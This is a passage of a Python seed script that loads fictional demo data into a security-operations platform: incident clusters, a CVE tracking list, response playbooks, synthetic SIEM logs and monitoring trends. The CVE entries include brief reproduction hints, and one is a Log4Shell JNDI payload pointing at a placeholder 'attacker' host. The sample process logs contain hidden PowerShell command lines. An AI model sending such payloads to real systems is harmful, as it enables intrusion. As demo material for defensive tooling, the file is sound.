         "description": "矿池通信、异常高 CPU 进程与 cron 持久化三个维度聚合，根因为 Jenkins 未授权 API。",
         "severity": "medium", "attack_type": "crypto_mining", "confidence": 0.89, "risk": 71.0,
         "alert_keys": ["miner-pool-01", "miner-proc-01", "miner-cron-01"],
         "entities": {"source_ips": ["91.240.118.172"], "hosts": ["k8s-node-03", "dev-jenkins-01"]},
         "first_h": 122, "last_h": 120, "status": "resolved", "assign": "admin",
         "tactics": ["Execution", "Persistence", "Impact"], "techniques": ["T1496", "T1053.003"],
         "summary": "通过 Jenkins 未授权接口投递挖矿容器，预发节点 egress 未受限放大了影响。",
         "remediation": "Jenkins 启用认证；K8s NetworkPolicy 限制预发 egress；矿池域名 DNS 拦截。",
         "assets": ["k8s-node-03", "dev-jenkins-01"], "users": [],
         "impact": "预发节点 CPU 资源被占用约 6 小时，无数据影响。"},
    {"key": "ce-web-attack", "rule_id": "rule-web-attack-surge",
         "title": "Web 层自动化攻击聚簇（SQLi / Log4Shell / 扫描）",
         "description": "同一扫描活动群的 Web 攻击聚合，WAF 全部拦截。",
         "severity": "low", "attack_type": "web_attack", "confidence": 0.76, "risk": 42.0,
         "alert_keys": ["sqli-01", "sqli-02", "sqli-03", "log4shell-01", "nmap-web-01"],
         "entities": {"source_ips": ["196.52.43.54", "118.25.6.39", "45.155.205.233"]},
         "first_h": 188, "last_h": 140, "status": "closed", "assign": "admin",
         "tactics": ["Initial Access", "Discovery"], "techniques": ["T1190", "T1046"],
         "summary": "自动化扫描活动，包含 Log4Shell 定向 payload，需关注 45.155.205.233 的多手段特征。",
         "remediation": "保持 WAF 虚拟补丁；组件升级纳入例行。",
         "assets": ["web-prod-01", "web-prod-02", "dev-jenkins-01"], "users": [],
         "impact": "无。"},
    {"key": "ce-exfil", "rule_id": "rule-data-exfiltration",
         "title": "数据外发聚簇：个人网盘上传 + 邮箱自动转发 + DNS 隧道",
         "description": "hr-laptop-wang 外发上传、wang.xiaotong 邮箱自动转发规则与 it-laptop-zhang DNS 隧道疑似同一内部数据窃取活动。",
         "severity": "high", "attack_type": "data_exfiltration", "confidence": 0.78, "risk": 84.0,
         "alert_keys": ["exfil-upload-01", "mail-rule-01", "dns-tunnel-01"],
         "entities": {"source_ips": ["192.168.20.22", "192.168.10.21"], "users": ["wang.xiaotong@acme-corp.cn", "zhang.wei"]},
         "first_h": 33, "last_h": 3, "status": "open", "assign": None,
         "tactics": ["Collection", "Exfiltration", "Command and Control"],
         "techniques": ["T1567.002", "T1114.003", "T1071.004"],
         "summary": "外发通道多元（HTTPS 网盘 / 邮箱转发 / DNS 隧道），且集中在 HR 与 IT 运维两个岗位，符合内部人员批量带走薪资与员工数据的行为画像。DNS 隧道尚不能排除为 C2 反向通道。",
         "remediation": "1) 暂停两个账户的外网访问并约谈；2) 对 weshare-api.top 与 0xcd10e1.tech 做 TLS 指纹与 JA3 回溯；3) 法务介入评估数据范围。",
         "assets": ["hr-laptop-wang", "it-laptop-zhang", "mail-exch-01"],
         "users": ["wang.xiaotong@acme-corp.cn"],
         "impact": "疑似员工薪酬与个人信息数据外泄，具体范围待取证。"},
    {"key": "ce-vuln-exposure", "rule_id": "rule-critical-vuln-exposure",
         "title": "高危漏洞暴露面聚簇（堡垒机 / VPN / K8s）",
         "description": "Trivy 定时扫描发现三个边界高价值资产存在可被在野利用的漏洞。",
         "severity": "high", "attack_type": "vulnerability_exposure", "confidence": 0.98, "risk": 88.0,
         "alert_keys": ["vuln-citrix-01", "vuln-regression-01", "vuln-runc-01"],
         "entities": {"hosts": ["vpn-gw-01", "jump-bastion-01", "k8s-node-01"]},
         "first_h": 55, "last_h": 12, "status": "investigating", "assign": "admin",
         "tactics": ["Initial Access"], "techniques": ["T1190"],
         "summary": "Citrix Bleed（CVE-2023-4966）在勒索组织攻击链中被广泛用于前置突破，VPN 网关公网暴露，优先级最高。",
         "remediation": "今晚升级 NetScaler；OpenSSH 升级纳入本迭代；runc 随集群升级。",
         "assets": ["vpn-gw-01", "jump-bastion-01", "k8s-node-01"], "users": [],
         "impact": "边界设备若被利用可直接进入内网，影响面为全公司。"},
    {"key": "ce-noise-scan", "rule_id": "rule-scan-noise",
         "title": "互联网背景扫描噪音（合并视图）",
         "description": "14 天内 55 次低危扫描与无效登录聚簇，用于降噪视图。",
         "severity": "low", "attack_type": "reconnaissance", "confidence": 0.65, "risk": 12.0,
         "alert_keys": ["nmap-web-01"],
         "entities": {"source_ips": ["196.52.43.54", "118.25.6.39"]},
         "first_h": 14 * 24, "last_h": 2, "status": "closed", "assign": None,
         "tactics": ["Discovery"], "techniques": ["T1046"],
         "summary": "背景噪音，无利用行为。",
         "remediation": "保持黑洞路由与 WAF 基线。",
         "assets": [], "users": [], "impact": "无。"},
]

VULNERABILITIES: list[dict] = [
    {"cve": "CVE-2023-4966", "title": "Citrix Bleed — NetScaler ADC 会话令牌泄露",
         "description": "NetScaler ADC / Gateway 在特定配置下泄露有效会话令牌，攻击者可绕过 MFA 劫持 VPN 会话，已被多个勒索组织在野利用。",
         "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.AUTHENTICATION_BYPASS,
         "status": VulnerabilityStatus.IN_PROGRESS, "component": "NetScaler ADC", "version": "13.1-48.47",
         "vector": "网络（公网暴露的 VPN 网关）", "impact": "VPN 会话劫持 → 内网横向移动入口",
         "reproduce": "向 /oauth/idp/.well-known/openid-configuration 发送超长 Host 头并读取响应泄漏的会话令牌",
         "fix": "升级至 13.1-49.15+，升级后强制注销全部活动会话", "reporter": "trivy-scanner", "reported_h": 12,
         "cvss": 9.4, "triaged_h": 11, "in_progress_h": 10},
    {"cve": "CVE-2024-6387", "title": "regreSSHion — OpenSSH 信号处理竞态条件 RCE",
         "description": "OpenSSH 8.5p1-9.7p1 在 SIGALRM 处理中存在竞态条件，未认证远程代码执行。",
         "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.OTHER,
         "status": VulnerabilityStatus.TRIAGED, "component": "OpenSSH", "version": "9.2p1",
         "vector": "网络（SSH 22 端口公网可达）", "impact": "堡垒机被预认证 RCE 的理论路径",
         "reproduce": "高并发连接竞争 SIGALRM 窗口（平均需约 1 万次尝试）",
         "fix": "升级 OpenSSH 9.8p1+；临时缓解设置 LoginGraceTime=0", "reporter": "trivy-scanner", "reported_h": 30,
         "cvss": 8.1, "triaged_h": 28},
    {"cve": "CVE-2024-21626", "title": "runc 工作目录泄露导致容器逃逸",
         "description": "runc ≤1.1.11 的内部文件描述符泄露允许容器进程访问宿主机文件系统。",
         "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.OTHER,
         "status": VulnerabilityStatus.TRIAGED, "component": "runc / containerd", "version": "runc 1.1.10",
         "vector": "本地（需已具备构建/运行容器权限）", "impact": "预发节点容器逃逸",
         "reproduce": "以恶意 WORKDIR 构建镜像并运行",
         "fix": "随 K8s 1.29 升级 containerd 1.7.16+（runc 1.1.12）", "reporter": "trivy-scanner", "reported_h": 55,
         "cvss": 8.6, "triaged_h": 52},
    {"cve": "CVE-2023-44487", "title": "HTTP/2 Rapid Reset 拒绝服务",
         "description": "HTTP/2 协议实现缺陷，攻击者可利用流重置放大造成拒绝服务。",
         "severity": VulnerabilitySeverity.MEDIUM, "vtype": VulnerabilityType.OTHER,
         "status": VulnerabilityStatus.VERIFIED, "component": "Nginx (api-gateway)", "version": "1.24.0",
         "vector": "网络", "impact": "API 网关可用性风险",
         "reproduce": "以 h2load 高频创建并立即重置 HTTP/2 流",
         "fix": "已启用 keepalive_requests 限额与 WAF flood 规则", "reporter": "trivy-scanner", "reported_h": 80,
         "cvss": 7.5, "triaged_h": 78, "in_progress_h": 77, "fixed_h": 76.5, "verified_h": 76},
    {"cve": "CVE-2021-44228", "title": "Log4Shell — Apache Log4j2 JNDI 注入 RCE",
         "description": "log4j2 <2.15 的 JNDI lookup 特性允许未认证远程代码执行。",
         "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.INSECURE_DESERIALIZATION,
         "status": VulnerabilityStatus.CLOSED, "component": "log4j-core (Jenkins)", "version": "2.14.1",
         "vector": "网络（Jenkins 8080 研发网段）", "impact": "研发网段 RCE → 生产镜像投毒跳板",
         "reproduce": "User-Agent: ${jndi:ldap://attacker/exp}",
         "fix": "已升级 log4j 2.17.1；CI 加入 Trivy 门禁", "reporter": "trivy-scanner", "reported_h": 300,
         "cvss": 10.0, "triaged_h": 299, "in_progress_h": 296, "fixed_h": 292, "verified_h": 291, "closed_h": 290},
    {"cve": "CVE-2022-22965", "title": "Spring4Shell — Spring MVC 数据绑定 RCE",
         "description": "Spring Framework 5.3.0-5.3.17 在 JDK9+ 部署于 Tomcat 时可通过 ClassLoader 数据绑定 RCE。",
         "severity": VulnerabilitySeverity.HIGH, "vtype": VulnerabilityType.INSECURE_DESERIALIZATION,
         "status": VulnerabilityStatus.FALSE_POSITIVE, "component": "Spring MVC (shop-api)", "version": "5.3.16",
         "vector": "网络", "impact": "—",
         "reproduce": "—", "fix": "误报：应用运行于 JDK 8，不满足利用条件；保留跟踪项作为证明",
         "reporter": "nmap-vuln-scan", "reported_h": 210, "cvss": 9.8, "triaged_h": 205, "closed_h": 200},
    {"cve": "CVE-2023-38545", "title": "curl SOCKS5 堆缓冲区溢出",
         "description": "curl 8.3.0 存在 SOCKS5 代理握手堆溢出（罕见配置触发）。",
         "severity": VulnerabilitySeverity.MEDIUM, "vtype": VulnerabilityType.OTHER,
         "status": VulnerabilityStatus.REPORTED, "component": "curl (base image)", "version": "8.2.1",
         "vector": "本地（需代理配置触发）", "impact": "低",
         "reproduce": "—", "fix": "基础镜像例行升级", "reporter": "trivy-scanner", "reported_h": 44, "cvss": 6.5},
    {"cve": "CVE-2024-45519", "title": "Zimbra postjournal 远程命令执行",
         "description": "Zimbra Collaboration Suite postjournal 服务未充分校验收件人字段，可注入命令。",
         "severity": VulnerabilitySeverity.CRITICAL, "vtype": VulnerabilityType.OTHER,
         "status": VulnerabilityStatus.REPORTED, "component": "Zimbra (mail-exch-01)", "version": "9.0.0 P34",
         "vector": "网络（SMTP）", "impact": "邮件服务器 RCE",
         "reproduce": "—", "fix": "升级 P41+；临时关闭 postjournal", "reporter": "trivy-scanner", "reported_h": 8, "cvss": 9.8},
]

PLAYBOOK_DEFS: list[dict] = [
    {"key": "phishing-response", "name": "钓鱼邮件 IOC 自动响应",
         "description": "接收邮件网关推送的钓鱼告警 → 提取 IOC → OTX 情报比对 → 高置信自动封禁并通知 SOC。",
         "nodes": [
             {"id": "intake", "name": "接收告警输入", "type": "extract_iocs",
              "config": {"source_field": "$.input.alert_body", "ioc_types": ["ip", "domain", "url", "email"]}},
             {"id": "ti_lookup", "name": "OTX 情报比对", "type": "ti_lookup_otx",
              "config": {"pulse_expiration_days": 180}},
             {"id": "decision", "name": "置信度判定", "type": "decision",
              "config": {"expression": "$.output.ti.malicious_count >= 2"}},
             {"id": "block", "name": "防火墙封禁", "type": "http_request",
              "config": {"method": "POST", "url": "http://firewall-api.internal:8080/api/v1/rules/blacklist", "timeout": 10}},
             {"id": "notify", "name": "通知 SOC 群", "type": "slack_webhook",
              "config": {"webhook_url_env": "SLACK_SOC_WEBHOOK", "message": "钓鱼 IOC 已自动封禁: {{$.output.blocked}}"}},
         ],
         "edges": [{"source": "intake", "target": "ti_lookup"},
                {"source": "ti_lookup", "target": "decision"},
                {"source": "decision", "target": "block", "condition": "$.output.ti.malicious_count >= 2"},
                {"source": "decision", "target": "notify", "condition": "$.output.ti.malicious_count < 2"},
                {"source": "block", "target": "notify"}]},
    {"key": "ssh-bruteforce", "name": "SSH 暴力破解自动处置",
         "description": "识别 SSH 爆破聚簇 → 富化来源信誉 → 达到阈值自动封禁 → 记录处置工单。",
         "nodes": [
             {"id": "intake", "name": "接收爆破告警", "type": "extract_iocs",
              "config": {"source_field": "$.input.alert_body", "ioc_types": ["ip"]}},
             {"id": "enrich", "name": "资产与来源富化", "type": "http_request",
              "config": {"method": "GET", "url": "http://abuseipdb-proxy.internal:8090/check",
                         "params": {"ip": "{{$.output.iocs[0]}}"}, "timeout": 10}},
             {"id": "decision", "name": "封禁阈值判定", "type": "decision",
              "config": {"expression": "$.output.abuse.confidence >= 80"}},
             {"id": "block", "name": "fail2ban 封禁", "type": "http_request",
              "config": {"method": "POST", "url": "http://jump-bastion-01:8443/fail2ban/ban", "timeout": 5}},
             {"id": "approve", "name": "人工复核（可选）", "type": "human_approval",
              "config": {"approvers": ["admin"], "timeout_minutes": 30}},
         ],
         "edges": [{"source": "intake", "target": "enrich"},
                {"source": "enrich", "target": "decision"},
                {"source": "decision", "target": "block", "condition": "$.output.abuse.confidence >= 80"},
                {"source": "decision", "target": "approve", "condition": "$.output.abuse.confidence < 80"},
                {"source": "block", "target": "approve"}]},
    {"key": "vuln-enrich", "name": "高危漏洞情报富化",
         "description": "Trivy 新增高危漏洞 → 查询 NVD/EPSS → 结合资产暴露面计算优先级 → 通知修复组。",
         "nodes": [
             {"id": "intake", "name": "接收漏洞告警", "type": "extract_iocs",
              "config": {"source_field": "$.input.alert_body", "ioc_types": ["cve"]}},
             {"id": "nvd", "name": "NVD/EPSS 富化", "type": "http_request",
              "config": {"method": "GET", "url": "https://services.nvd.nist.gov/rest/json/cves/2.0",
                         "params": {"cveId": "{{$.output.iocs[0]}}"}, "timeout": 15}},
             {"id": "notify", "name": "通知修复组", "type": "slack_webhook",
              "config": {"webhook_url_env": "SLACK_PATCH_WEBHOOK"}},
         ],
         "edges": [{"source": "intake", "target": "nvd"}, {"source": "nvd", "target": "notify"}]},
]

PLAYBOOK_RUN_SPECS: list[tuple] = [
    # (key, pb_name, started_h, status, mode, trigger, steps, error)
    ("ph-1", "钓鱼邮件 IOC 自动响应", 2.5, "success", "apply", "webhook",
     [("intake", "接收告警输入", "extract_iocs", 320, None),
      ("ti_lookup", "OTX 情报比对", "ti_lookup_otx", 2100, None),
      ("decision", "置信度判定", "decision", 8, None),
      ("block", "防火墙封禁", "http_request", 640, None),
      ("notify", "通知 SOC 群", "slack_webhook", 210, None)], None),
    ("ph-2", "钓鱼邮件 IOC 自动响应", 6.0, "success", "apply", "webhook",
     [("intake", "接收告警输入", "extract_iocs", 280, None),
      ("ti_lookup", "OTX 情报比对", "ti_lookup_otx", 1900, None),
      ("decision", "置信度判定", "decision", 7, None),
      ("block", "防火墙封禁", "http_request", 590, None),
      ("notify", "通知 SOC 群", "slack_webhook", 180, None)], None),
    ("ph-3", "钓鱼邮件 IOC 自动响应", 9.5, "failed", "apply", "webhook",
     [("intake", "接收告警输入", "extract_iocs", 300, None),
      ("ti_lookup", "OTX 情报比对", "ti_lookup_otx", 4500, "OTX API rate limit (429), retry exhausted"),
      ("decision", "置信度判定", "decision", 0, "upstream failed")],
     "节点 ti_lookup 执行失败: OTX API rate limit (429)"),
    ("ph-h1", "钓鱼邮件 IOC 自动响应", 30, "success", "apply", "webhook",
     [("intake", "接收告警输入", "extract_iocs", 310, None),
      ("ti_lookup", "OTX 情报比对", "ti_lookup_otx", 2200, None),
      ("decision", "置信度判定", "decision", 9, None),
      ("block", "防火墙封禁", "http_request", 610, None),
      ("notify", "通知 SOC 群", "slack_webhook", 200, None)], None),
    ("ph-h2", "钓鱼邮件 IOC 自动响应", 74, "success", "dry_run", "manual",
     [("intake", "接收告警输入", "extract_iocs", 290, None),
      ("ti_lookup", "OTX 情报比对", "ti_lookup_otx", 2050, None),
      ("decision", "置信度判定", "decision", 8, None),
      ("block", "防火墙封禁", "http_request", 570, None),
      ("notify", "通知 SOC 群", "slack_webhook", 190, None)], None),
    ("ssh-1", "SSH 暴力破解自动处置", 4.2, "success", "apply", "webhook",
     [("intake", "接收爆破告警", "extract_iocs", 260, None),
      ("enrich", "资产与来源富化", "http_request", 980, None),
      ("decision", "封禁阈值判定", "decision", 6, None),
      ("block", "fail2ban 封禁", "http_request", 450, None),
      ("approve", "人工复核（可选）", "human_approval", 30000, None)], None),
    ("ssh-2", "SSH 暴力破解自动处置", 20.1, "success", "apply", "webhook",
     [("intake", "接收爆破告警", "extract_iocs", 250, None),
      ("enrich", "资产与来源富化", "http_request", 1020, None),
      ("decision", "封禁阈值判定", "decision", 6, None),
      ("block", "fail2ban 封禁", "http_request", 430, None),
      ("approve", "人工复核（可选）", "human_approval", 28000, None)], None),
    ("ssh-3", "SSH 暴力破解自动处置", 26.0, "partial", "apply", "cron",
     [("intake", "接收爆破告警", "extract_iocs", 270, None),
      ("enrich", "资产与来源富化", "http_request", 890, None),
      ("decision", "封禁阈值判定", "decision", 5, None),
      ("block", "fail2ban 封禁", "http_request", 0, "skipped: confidence 62 < 80")], None),
    ("ssh-4", "SSH 暴力破解自动处置", 47, "cancelled", "apply", "manual",
     [("intake", "接收爆破告警", "extract_iocs", 240, None),
      ("enrich", "资产与来源富化", "http_request", 950, None),
      ("decision", "封禁阈值判定", "decision", 5, None),
      ("block", "fail2ban 封禁", "http_request", 0, None),
      ("approve", "人工复核（可选）", "human_approval", 0, None)],
     "用户手动取消"),
    ("ssh-5", "SSH 暴力破解自动处置", 6 * 24, "success", "apply", "webhook",
     [("intake", "接收爆破告警", "extract_iocs", 255, None),
      ("enrich", "资产与来源富化", "http_request", 870, None),
      ("decision", "封禁阈值判定", "decision", 6, None),
      ("block", "fail2ban 封禁", "http_request", 440, None),
      ("approve", "人工复核（可选）", "human_approval", 26000, None)], None),
    ("vuln-1", "高危漏洞情报富化", 12.2, "success", "apply", "cron",
     [("intake", "接收漏洞告警", "extract_iocs", 180, None),
      ("nvd", "NVD/EPSS 富化", "http_request", 1600, None),
      ("notify", "通知修复组", "slack_webhook", 170, None)], None),
    ("vuln-2", "高危漏洞情报富化", 30.5, "success", "apply", "cron",
     [("intake", "接收漏洞告警", "extract_iocs", 175, None),
      ("nvd", "NVD/EPSS 富化", "http_request", 1480, None),
      ("notify", "通知修复组", "slack_webhook", 160, None)], None),
    ("vuln-3", "高危漏洞情报富化", 8.0, "running", "apply", "cron",
     [("intake", "接收漏洞告警", "extract_iocs", 190, None),
      ("nvd", "NVD/EPSS 富化", "http_request", 2100, None),
      ("notify", "通知修复组", "slack_webhook", 0, None)], None),
    ("vuln-4", "高危漏洞情报富化", 55.2, "success", "apply", "cron",
     [("intake", "接收漏洞告警", "extract_iocs", 185, None),
      ("nvd", "NVD/EPSS 富化", "http_request", 1520, None),
      ("notify", "通知修复组", "slack_webhook", 165, None)], None),
    ("vuln-5", "高危漏洞情报富化", 3 * 24, "success", "apply", "cron",
     [("intake", "接收漏洞告警", "extract_iocs", 178, None),
      ("nvd", "NVD/EPSS 富化", "http_request", 1560, None),
      ("notify", "通知修复组", "slack_webhook", 158, None)], None),
]


def build_playbook_runs() -> list[tuple[PlaybookRunModel, list[PlaybookRunStepModel]]]:
    runs: list[tuple[PlaybookRunModel, list[PlaybookRunStepModel]]] = []
    for key, pb_name, started_h, status, mode, trigger, step_specs, error in PLAYBOOK_RUN_SPECS:
        started = ago(hours=started_h)
        finished = None if status == "running" else started + timedelta(seconds=90 + int(started_h) % 7)
        run = PlaybookRunModel(
            id=uid("run", key),
            playbook_name=pb_name,
            playbook_version="1.0.0",
            mode=mode,
            status=status,
            created_by_user_id=ADMIN_ID,
            input_json={"demo": True},
            output_json={"summary": "demo run"} if status == "success" else {},
            started_at=started,
            finished_at=finished,
            error_message=error,
            engine_version="7.0.0",
            execution_mode="dag",
            definition_id=uid("pb-def", pb_name),
            failure_strategy="continue",
            trigger_source=trigger,
        )
        steps = []
        for idx, (sid, sname, stype, dur, serr) in enumerate(step_specs):
            s_status = "success"
            if status == "failed" and idx == len(step_specs) - 1:
                s_status = "failed"
            elif status == "partial" and idx == len(step_specs) - 1:
                s_status = "skipped"
            elif status == "cancelled" and idx >= 2:
                s_status = "cancelled"
            elif status == "running":
                s_status = "success" if idx < 2 else "running"
            step_started = started + timedelta(seconds=idx * 12)
            step_finished = None if s_status in ("running", "cancelled") else step_started + timedelta(milliseconds=dur)
            steps.append(PlaybookRunStepModel(
                run_id=run.id, step_index=idx, step_id=sid, step_name=sname, step_type=stype,
                status=s_status, started_at=step_started, finished_at=step_finished,
                duration_ms=dur if s_status == "success" else None,
                input_json={}, output_json={"ok": s_status == "success"},
                error_text=serr,
            ))
        runs.append((run, steps))
    return runs


def build_siem_logs() -> list[SIEMLog]:
    """48 小时 SIEM 原始日志（认证 / 网络 / 进程 / 云审计），供威胁狩猎检索。"""
    logs: list[SIEMLog] = []
    scan_ips = list(EXT_IPS.keys())
    users = ["zhang.wei", "liu.yiming", "wang.xiaotong", "admin", "svc_backup$", "deploy"]
    hosts = ["jump-bastion-01", "dc-dc01", "filesrv-01", "web-prod-01", "k8s-node-03"]

    for i in range(360):
        hour = 48 * (i % 97) / 97.0  # 覆盖近 48h，确定性散布
        ts = ago(hours=hour, minutes=(i * 7) % 60)
        kind = i % 4
        if kind == 0:  # SSH 认证失败
            ip = scan_ips[i % len(scan_ips)]
            user = "root" if i % 2 else "admin"
            logs.append(SIEMLog(
                id=uid("siem", f"auth-{i}"), tenant_id="default", timestamp=ts,
                source="wazuh", log_type="authentication",
                raw_data=f"Failed password for {user} from {ip} port {40000 + i % 9000} ssh2",
                parsed_fields={"demo": True, "event": "ssh_auth_failure", "src_ip": ip,
                               "user": user, "host": "jump-bastion-01",
                               "action": "failed", "result": "failed"},
            ))
        elif kind == 1:  # 网络 / TLS 会话
            ip = scan_ips[(i + 3) % len(scan_ips)]
            logs.append(SIEMLog(
                id=uid("siem", f"net-{i}"), tenant_id="default", timestamp=ts,
                source="suricata", log_type="network",
                raw_data=f'{{"src_ip":"192.168.10.21","dest_ip":"{ip}","dest_port":443,"proto":"TLS","bytes":{1200 + i * 137}}}',
                parsed_fields={"demo": True, "event": "tls_session", "src_ip": "192.168.10.21",
                               "dest_ip": ip, "dest_port": 443, "protocol": "TCP", "action": "allow"},
            ))
        elif kind == 2:  # 进程创建
            u = users[i % len(users)]
            h = hosts[i % len(hosts)]
            image = "rundll32.exe" if i % 2 else "powershell.exe"
            cmdline = "-enc SGVsbG8=" if i % 2 else "-nop -w hidden -c Get-Process"
            logs.append(SIEMLog(
                id=uid("siem", f"proc-{i}"), tenant_id="default", timestamp=ts,
                source="sysmon", log_type="process",
                raw_data=f'{{"EventID":1,"User":"ACME\\\\{u}","Host":"{h}","Image":"{image}","CommandLine":"{cmdline}"}}',
                parsed_fields={"demo": True, "event": "process_create", "user": u, "host": h,
                               "process": image, "action": "create", "result": "success"},
            ))
        else:  # 云审计
            u = users[i % 4]
            src_ip = "43.155.132.88" if i % 7 == 0 else "203.0.113.50"
            event_name = "ConsoleLogin" if i % 2 else "DescribeInstances"
            logs.append(SIEMLog(
                id=uid("siem", f"cloud-{i}"), tenant_id="default", timestamp=ts,
                source="cloudtrail", log_type="cloud_audit",
                raw_data=f'{{"eventName":"{event_name}","userIdentity":"{u}","sourceIPAddress":"{src_ip}"}}',
                parsed_fields={"demo": True, "event": "cloud_api_call", "user": u,
                               "src_ip": src_ip,
                               "action": "console_login" if i % 2 else "api_call", "result": "success"},
            ))
    return logs


def build_monitor_history() -> list[MonitorHistoryModel]:
    """近 24h 系统资源趋势（5 分钟粒度，确定性波形）。"""
    rows: list[MonitorHistoryModel] = []
    total_min = 24 * 60
    for i in range(0, total_min + 1, 5):
        frac = i / total_min  # 0→1，越新越接近 1
        minutes_ago = total_min - i
        ts = ago(minutes=minutes_ago)
        phase = i / 60.0  # ~8 小时周期
        cpu = 34 + 16 * math.sin(phase * 0.8) + 6 * math.sin(phase * 2.3) + (i % 5)
        mem = 58 + 5 * math.sin(phase * 0.5) + (i % 3)
        # 最近 2 小时有个小负载高峰（与告警剧情呼应）
        if minutes_ago < 120:
            cpu += 18 * (1 - minutes_ago / 120.0)
        rpm = int(760 + 380 * math.sin(phase * 0.8) + (i % 11) * 9)
        err = 0.4 + 0.25 * math.sin(phase * 1.7) + (i % 4) * 0.06
        if minutes_ago < 120:
            err += 1.8 * (1 - minutes_ago / 120.0)
        disk_pct = 46 + 4 * frac
        rows.append(MonitorHistoryModel(
            timestamp=ts,
            cpu_percent=round(min(cpu, 96.0), 1),
            memory_percent=round(mem, 1),
            memory_used_gb=round(32 * mem / 100, 2),
            memory_total_gb=32.0,
            disk_percent=round(disk_pct, 1),
            disk_used_gb=round(2048 * disk_pct / 100, 1),
            disk_total_gb=2048.0,
            services={"api": "healthy", "database": "healthy", "redis": "healthy",
                      "ai_service": "warning" if minutes_ago < 120 else "healthy",
                      "websocket": "healthy", "demo": True},
            requests_per_minute=rpm,
            error_rate=round(max(err, 0.05), 2),
            avg_response_time_ms=round(95 + 60 * math.sin(phase * 0.9) + (i % 7) * 4, 1),
        ))
    return rows


# ────────────────────────────────────────────────────────────────────
# 入库逻辑
# ────────────────────────────────────────────────────────────────────

ADMIN_ID = ""  # main() 中填充


def demo_run_ids() -> list[str]:
    return [uid("run", spec[0]) for spec in PLAYBOOK_RUN_SPECS]


async def reset_demo_data(session) -> dict:
    """按确定性 ID 精确清除种子数据（不动用户自建数据）。"""
    purged: dict[str, int] = {}
    demo_case_ids = [uid("case", c["key"]) for c in CASES]
    demo_pb_ids = [uid("pb-def", p["name"]) for p in PLAYBOOK_DEFS]
    run_ids = demo_run_ids()

    demo_alert_rows = await session.scalars(
        select(SecurityAlert.id).where(SecurityAlert.external_event_id.like("DEMO-%"))
    )
    demo_alert_ids = list(demo_alert_rows.all())

    purged["alert_notes"] = await purge_rows(session, AlertNoteModel, AlertNoteModel.alert_id.in_(demo_alert_ids))
    purged["case_alerts"] = await purge_rows(session, CaseAlertAssociation, CaseAlertAssociation.alert_id.in_(demo_alert_ids))
    purged["case_alerts_by_case"] = await purge_rows(session, CaseAlertAssociation, CaseAlertAssociation.case_id.in_(demo_case_ids))
    purged["case_timeline"] = await purge_rows(session, CaseTimelineEntry, CaseTimelineEntry.case_id.in_(demo_case_ids))
    purged["case_comments"] = await purge_rows(session, CaseComment, CaseComment.case_id.in_(demo_case_ids))
    purged["cases"] = await purge_rows(session, CaseModel, CaseModel.id.in_(demo_case_ids))
    purged["security_alerts"] = await purge_rows(session, SecurityAlert, SecurityAlert.external_event_id.like("DEMO-%"))

    purged["ioc_hits"] = await purge_rows(session, IOCHitDB, IOCHitDB.id.in_([uid("ioc", row[0]) for row in IOC_HITS]))
    purged["blocked_ips"] = await purge_rows(session, BlockedIP, BlockedIP.id.in_([uid("blocked", b[0]) for b in BLOCKED_IPS]))
    purged["correlated_events"] = await purge_rows(session, CorrelatedEvent, CorrelatedEvent.id.in_([uid("ce", c["key"]) for c in CORRELATED_EVENTS]))
    purged["siem_logs"] = await purge_rows(session, SIEMLog, func.json_extract(SIEMLog.parsed_fields, "$.demo") == 1)
    purged["monitor_history"] = await purge_rows(session, MonitorHistoryModel, func.json_extract(MonitorHistoryModel.services, "$.demo") == 1)
    purged["playbook_run_steps"] = await purge_rows(session, PlaybookRunStepModel, PlaybookRunStepModel.run_id.in_(run_ids))
    purged["playbook_runs"] = await purge_rows(session, PlaybookRunModel, PlaybookRunModel.id.in_(run_ids))
    purged["playbook_definitions"] = await purge_rows(session, PlaybookDefinitionModel, PlaybookDefinitionModel.id.in_(demo_pb_ids))
    purged["assets"] = await purge_rows(session, AssetDB, AssetDB.hostname.in_([a[0] for a in ASSETS]))
    purged["vulnerabilities"] = await purge_rows(
        session, SecurityVulnerability, SecurityVulnerability.cve_id.in_([v["cve"] for v in VULNERABILITIES])
    )
    await session.flush()
    return purged


async def seed(session) -> dict:
    counts: dict[str, int] = {}

    # 1. 资产
    existing_assets = set(
        (await session.scalars(select(AssetDB.hostname).where(AssetDB.hostname.in_([a[0] for a in ASSETS])))).all()
    )
    asset_ids: dict[str, str] = {}
    new_assets = []
    for hostname, ip, owner, business, criticality, tags, notes in ASSETS:
        asset_ids[hostname] = uid("asset", hostname)
        if hostname in existing_assets:
            continue
        new_assets.append(AssetDB(
            id=asset_ids[hostname], hostname=hostname, ip=ip, owner=owner, business=business,
            criticality=criticality,
            # tags 列约定为 JSON 数组字符串，与 AssetService._to_response 的解析一致
            tags=json.dumps([t.strip() for t in tags.split(",") if t.strip()]) if tags else None,
            notes=f"{notes}（演示数据）", is_active=True,
            created_at=ago(days=30), updated_at=ago(days=30),
        ))
    session.add_all(new_assets)
    counts["assets"] = len(new_assets)

    # 2. 告警（story + noise）
    existing_events = set(
        (await session.scalars(
            select(SecurityAlert.external_event_id).where(SecurityAlert.external_event_id.like("DEMO-%"))
        )).all()
    )
    alerts: list[SecurityAlert] = []
    for a in build_story_alerts() + build_noise_alerts():
        if a.external_event_id in existing_events:
            continue
        alerts.append(a)
    session.add_all(alerts)
    await session.flush()  # 取得自增 id
    alerts_by_key = {a.external_event_id.removeprefix("DEMO-").lower(): a for a in alerts}
    counts["alerts"] = len(alerts)

    # 3. 告警分析笔记
    notes_spec = [
        ("c2-beacon-01", "admin", "已对 209.141.35.17 做全网流量回溯，近 7 天仅 it-laptop-zhang 一台主机外连，间隔 60±3s。"),
        ("c2-beacon-01", "wang.fang", "JA3 指纹已归档，与 Cobalt Strike 默认 profile 匹配度 92%。"),
        ("lsass-01", "admin", "svc_backup$ 账户已禁用；域管凭据轮换计划今晚 22:00 执行。"),
        ("ransom-fim-01", "admin", "加密范围确认：/data/share 下 3,214 个文件 / 41 个目录；备份快照完好。"),
        ("phish-email-01", "admin", "已通过 O365 撤回 9/12 封邮件，其余 3 封需终端侧清理。"),
        ("ident-impossible-01", "admin", "新加坡会话 IP 43.155.132.88 与钓鱼页宿主一致，判定为同一攻击者。"),
        ("bf-06", "admin", "Tor 出口节点，已对该 /24 段限速处理。"),
